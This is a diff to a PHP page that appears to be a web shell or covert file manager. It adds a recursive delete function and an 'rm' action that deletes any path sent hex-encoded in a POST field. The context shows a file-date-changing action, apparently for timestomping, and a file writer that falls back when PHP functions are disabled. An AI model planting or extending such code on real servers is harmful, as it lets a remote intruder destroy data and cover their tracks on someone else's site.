@@ -196,6 +196,23 @@ function writeFileContents($filename, $content)
     }
     return false; // all function disabled
 }
+function deleteAll($filename)
+{
+    if (is_dir($filename)) {
+        foreach (scandir($filename) as $key => $value) {
+            if ($value != "." && $value != "..") {
+                if (is_dir($filename . DIRECTORY_SEPARATOR . $value)) {
+                    deleteAll($filename . DIRECTORY_SEPARATOR . $value);
+                } else {
+                    @unlink($filename . DIRECTORY_SEPARATOR . $value);
+                }
+            }
+        }
+        return @rmdir($filename);
+    } else {
+        return @unlink($filename);
+    }
+}
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -300,6 +317,11 @@ function writeFileContents($filename, $content)
                 break;
             case 'touch_save':
                 if (!changeFileDate(hex2bin($_POST['path']), $_POST['date'])) {
+                    echo "failed";
+                }
+                break;
+            case 'rm':
+                if(!deleteAll(hex2bin($_POST['path']))) {
                     echo "failed";
                 }
                 break;
